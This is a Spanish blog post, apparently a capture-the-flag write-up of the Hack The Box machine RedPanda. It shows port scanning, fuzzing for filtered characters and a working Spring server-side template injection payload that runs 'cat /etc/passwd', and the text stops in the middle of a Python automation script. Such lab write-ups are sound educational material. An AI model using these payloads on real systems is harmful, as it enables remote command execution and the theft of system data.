<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="WriteUp RedPanda HTB" /><meta name="author" content="rabb1t" /><meta property="og:locale" content="es_ES" /><meta name="description" content="Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Buscando pandas rojos Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos Obteniendo una shell como el usuario woodenk Escalando privilegios Analizando procesos con pspy Analizando código en Java y explotando un XXE" /><meta property="og:description" content="Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Buscando pandas rojos Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos Obteniendo una shell como el usuario woodenk Escalando privilegios Analizando procesos con pspy Analizando código en Java y explotando un XXE" /><link rel="canonical" href="https://rabb1t-0.github.io/posts/WriteUp-RedPanda-HTB/" /><meta property="og:url" content="https://rabb1t-0.github.io/posts/WriteUp-RedPanda-HTB/" /><meta property="og:site_name" content="rabb1t" /><meta property="og:image" content="https://www.hackthebox.com/storage/avatars/0ba23d9bbfea967268e284e85e0837ff.png" /><meta property="og:image:height" content="180" /><meta property="og:image:width" content="180" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-11-26T00:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://www.hackthebox.com/storage/avatars/0ba23d9bbfea967268e284e85e0837ff.png" /><meta property="twitter:title" content="WriteUp RedPanda HTB" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"rabb1t"},"dateModified":"2024-08-03T17:28:44-05:00","datePublished":"2022-11-26T00:00:00-05:00","description":"Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Buscando pandas rojos Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos Obteniendo una shell como el usuario woodenk Escalando privilegios Analizando procesos con pspy Analizando código en Java y explotando un XXE","headline":"WriteUp RedPanda HTB","image":{"width":180,"height":180,"url":"https://www.hackthebox.com/storage/avatars/0ba23d9bbfea967268e284e85e0837ff.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rabb1t-0.github.io/posts/WriteUp-RedPanda-HTB/"},"url":"https://rabb1t-0.github.io/posts/WriteUp-RedPanda-HTB/"}</script><title>WriteUp RedPanda HTB | rabb1t</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/rbit.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/rbit.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/rbit.jpg"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/favicon/rbit.ico"><meta name="apple-mobile-web-app-title" content="rabb1t"><meta name="application-name" content="rabb1t"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto glitch"><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div></a></div><div class="site-title mt-3"> <a href="/">rabb1t</a></div><div class="site-subtitle font-italic">Blog personal, CTFS, artículos de ciberseguridad y más.</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog" class="nav-link cybr-btn"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> INICIO <span class='cybr-btn__glitch' aria-hidden=''>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> CATEGORÍAS <span aria-hidden class="cybr-btn__glitch">CATEGORÍAS </span> </a><li class="nav-item"> <a href="/tags/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> ETIQUETAS <span aria-hidden class="cybr-btn__glitch">ETIQUETAS </span> </a><li class="nav-item"> <a href="/archives/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> ARCHIVO <span aria-hidden class="cybr-btn__glitch">ARCHIVO </span> </a><li class="nav-item"> <a href="/about/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> ACERCA DE <span aria-hidden class="cybr-btn__glitch">ACERCA DE </span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/rabb1t-0 " aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/rabb1t" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog"> Inicio </a> </span> <span>WriteUp RedPanda HTB</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3C/svg%3E" data-src="https://www.hackthebox.com/storage/avatars/0ba23d9bbfea967268e284e85e0837ff.png" class="preview-img bg" alt="Preview Image" width="180" height="180" data-proofer-ignore><h1 data-toc-skip>WriteUp RedPanda HTB</h1><div class="post-meta text-muted"><div> Por <em> rabb1t </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" data-ts="1669438800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-11-26 </em> </span> <span> Actualizado <em class="timeago" data-ts="1722724124" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-08-03 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3877 palabras"> <em>21 min</em> de lectura</span></div></div></div><div class="post-content"><h2 id="índice"><span class="mr-2">Índice</span><a href="#índice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="#máquina-redpanda">Información básica de la máquina</a><li><a href="#herramientas-y-recursos-empleados">Herramientas y recursos empleados</a><li><a href="#enumeración">Enumeración</a><li><a href="#buscando-pandas-rojos">Buscando pandas rojos</a><li><a href="#explotando-la-vulnerabilidad-ssti-mientras-buscamos-pandas-rojos">Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos</a><ul><li><a href="#obteniendo-una-shell-como-el-usuario-woodenk">Obteniendo una shell como el usuario woodenk</a></ul><li><a href="#escalando-privilegios">Escalando privilegios</a><ul><li><a href="#analizando-procesos-con-pspy">Analizando procesos con pspy</a><li><a href="#analizando-código-en-java-y-explotando-un-xxe">Analizando código en Java y explotando un XXE</a></ul></ul><h2 id="máquina-redpanda"><span class="mr-2">Máquina RedPanda</span><a href="#máquina-redpanda" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="table-wrapper"><table><thead><tr><th>IP<th>10.10.11.156<tbody><tr><td>OS<td>Linux<tr><td>Dificultad<td>Fácil<tr><td>Creador<td>Woodenk</table></div><h2 id="herramientas-y-recursos-empleados"><span class="mr-2">Herramientas y recursos empleados</span><a href="#herramientas-y-recursos-empleados" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Herramientas<ul><li>nmap<li>whatweb<li>pspy<li>wfuzz</ul><li>Recursos<ul><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">AllTheThings</a><li>SecLists</ul></ul><hr /><h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Comenzamos realizando un escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> a la máquina víctima:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre><td class="rouge-code"><pre>Nmap 7.92 scan initiated Sun Jul 10 15:52:39 2022 as: nmap <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--open</span> <span class="nt">-Pn</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-oN</span> scope.txt 10.10.11.170
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report <span class="k">for </span>10.10.11.170
Host is up, received user-set <span class="o">(</span>1.9s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 48716 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 16817 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU<span class="o">=</span>
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 <span class="nv">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A</span><span class="o">=</span>
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
8080/tcp open  http-proxy syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
|     Content-Language: en-US
|     Date: Sun, 10 Jul 2022 15:53:48 GMT
|     Connection: close
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span> <span class="nb">dir</span><span class="o">=</span><span class="s2">"ltr"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">author</span><span class="o">=</span><span class="s2">"wooden_k"</span><span class="o">&gt;</span>
|     &lt;<span class="o">!</span><span class="nt">--Codepen</span> by khr2003: https://codepen.io/khr2003/pen/BGZdXw <span class="nt">--</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/panda.css"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"css/main.css"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
|     &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s1">'pande'</span><span class="o">&gt;</span>
|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s1">'ear left'</span><span class="o">&gt;</span>&lt;/div&gt;
|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s1">'ear right'</span><span class="o">&gt;</span>&lt;/div&gt;
|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s1">'whiskers left'</span><span class="o">&gt;</span>
|     &lt;span&gt;&lt;/span&gt;
|     &lt;span&gt;&lt;/span&gt;
|     &lt;span&gt;&lt;/span&gt;
|     &lt;/div&gt;
|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s1">'whiskers right'</span><span class="o">&gt;</span>
|     &lt;span&gt;&lt;/span&gt;
|     &lt;span&gt;&lt;/span&gt;
|     &lt;span&gt;&lt;/span&gt;
|     &lt;/div&gt;
|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s1">'face'</span><span class="o">&gt;</span>
|     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s1">'eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sun, 10 Jul 2022 15:53:49 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 10 Jul 2022 15:53:49 GMT
|     Connection: close
|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
|     Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
|_http-title: Red Panda Search | Made with Spring Boot
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 10 15:54:31 2022 -- 1 IP address (1 host up) scanned in 112.04 seconds
</span></pre></table></code></div></div><p>Solamente hay dos puertos abiertos, el 22 (SSH) y el 8080 (HTTP). De momento no contamos con usuarios ni credenciales para conectarnos a través de SSH. Vamos a enumerar el puerto 8080. Iniciemos usando la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> y ver qué nos reporta:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ whatweb http://10.10.11.170:8080 
http://10.10.11.170:8080 <span class="o">[</span>200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]
</pre></table></code></div></div><h3 id="buscando-pandas-rojos"><span class="mr-2">Buscando pandas rojos</span><a href="#buscando-pandas-rojos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>No nos dice gran cosa, además de ver que se está empleando <code class="language-plaintext highlighter-rouge">Spring Boot</code> un framework de <em>Java</em>. También podemos ver lo mismo en el reporte que nos hizo <code class="language-plaintext highlighter-rouge">nmap</code>. Procedamos a visualizar la web en nuestro navegador: <img data-src="/assets/favicon/2022-11-26/redPanda1.png" alt="Web RedPanda" data-proofer-ignore></p><p>Como vimos en el reporte que nos hizo <code class="language-plaintext highlighter-rouge">whatweb</code>, sabemos que es un buscador de pandas rojos. Bueno, vamos a buscar pandas rojos, obviamente: <img data-src="/assets/favicon/2022-11-26/redPanda2.png" alt="Web RedPanda" data-proofer-ignore></p><p>—Ese panda se ve un poco surreal—. Ahora ¿Qué tal si probamos alguna inyección tipica como SQL, XSS, LFI, etc? No sucede nada, pero sabemos que se está empleando <em>Java</em>, y puede darnos un indicio para intentar probar un <em>payload</em> para inyectar código malicioso. Veamos lo que sucede: <img data-src="/assets/favicon/2022-11-26/redPanda3.png" alt="Web RedPanda" data-proofer-ignore></p><p>Nos está baneando algún caracter especial (<code class="language-plaintext highlighter-rouge">[$*{}]</code>), así que podemos hacer un script que nos muestre qué caracteres se están bloqueando, lo podemos hacer con python o con otro lenguaje. En mi caso usaré <code class="language-plaintext highlighter-rouge">wfuzz</code> de la siguiente manera:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>❯ wfuzz <span class="nt">-c</span> <span class="nt">--ss</span> <span class="s1">'banned characters'</span> <span class="nt">-w</span> /usr/share/SecLists/Fuzzing/special-chars.txt <span class="nt">-d</span> <span class="s1">'name=FUZZ'</span> http://10.10.11.170:8080/search
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://10.10.11.170:8080/search
Total requests: 32

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                                 
<span class="o">=====================================================================</span>

000000001:   200        28 L     69 W       755 Ch      <span class="s2">"~"</span>                                                     
000000005:   200        28 L     69 W       755 Ch      <span class="s2">"$"</span>                                                     
000000013:   200        28 L     69 W       755 Ch      <span class="s2">"_"</span>                                                     

Total <span class="nb">time</span>: 2.242391
Processed Requests: 32
Filtered Requests: 29
Requests/sec.: 14.27047
</pre></table></code></div></div><p>Se destaca el comando <code class="language-plaintext highlighter-rouge">--ss</code>, el cual nos muestra solo las solicitudes en las que aparezca el parámetro dado (<code class="language-plaintext highlighter-rouge">banned characters</code>) en la respuesta. Vemos que hay 3 caracteres especiales que están siendo bloqueados. No podremos usarlos; sin embargo, el diccionario tiene 32 caracteres, nos quedarían 29 caracteres para probar una inyección. Llegados a este punto, he creado un diccionario quitando los 3 caracteres que nos están bloqueando:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s1">'~|\$|_'</span> /usr/share/SecLists/Fuzzing/special-chars.txt <span class="o">&gt;</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/dict.txt 
</pre></table></code></div></div><p>Ahora podemos hacer un script para verificar con qué caracteres obtendremos un resultado diferente, en mi caso hice una linea en bash:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>dict.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Caracter: </span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> curl <span class="nt">-s</span> <span class="nt">-d</span> <span class="s2">"name=</span><span class="k">${</span><span class="nv">i</span><span class="k">}</span><span class="s2">{7*7}"</span> http://10.10.11.170:8080/search | <span class="nb">grep</span> <span class="s1">'You searched for: 49'</span><span class="p">;</span> <span class="k">done</span>
</pre></table></code></div></div><h2 id="explotando-la-vulnerabilidad-ssti-mientras-buscamos-pandas-rojos"><span class="mr-2">Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos</span><a href="#explotando-la-vulnerabilidad-ssti-mientras-buscamos-pandas-rojos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Es probable que no sea tan práctico, pero al ejecutarlo nos muestra dos caracteres (<code class="language-plaintext highlighter-rouge">@*</code>), los cuales devuelven en la respuesta el número <code class="language-plaintext highlighter-rouge">49</code>. Teniendo dos caracteres para probar código, es cuando podemos buscar un payload bien diseñado para ejecutar comandos. En este caso he usado este payload del recurso <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java">AllTheThings</a>:</p><blockquote><p>${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}</p></blockquote><p>Para usar el anterior payload, debemos cambiar el caracter <code class="language-plaintext highlighter-rouge">$</code> por alguno de los otros caracteres obtenidos anteriormente. Cuando probamos a usar el caracter <code class="language-plaintext highlighter-rouge">@</code>, no observamos nada, pero al usar el caracter <code class="language-plaintext highlighter-rouge">*</code>, obtenemos: <img data-src="/assets/favicon/2022-11-26/redPanda4.png" alt="Web redPanda SSTI" data-proofer-ignore></p><h3 id="obteniendo-una-shell-como-el-usuario-woodenk"><span class="mr-2">Obteniendo una shell como el usuario woodenk</span><a href="#obteniendo-una-shell-como-el-usuario-woodenk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ahora podemos pensar que hacer el proceso del payload anterior para ejecutar comandos puede ser una tarea repetitiva y extenuante. Será mejor hacer un script que nos ayude a convertir cada caracter de una cadena en un número basándonos en el payload anterior. En mi caso hice un script en python:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="c1">#variables globales
</span><span class="n">IP</span> <span class="o">=</span> <span class="s">"10.10.11.170"</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="s">"8080"</span>
<span class="n">URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">IP</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s">/search"</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"name"</span><span class="p">:</span><span class="s">""</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Exit..."</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>

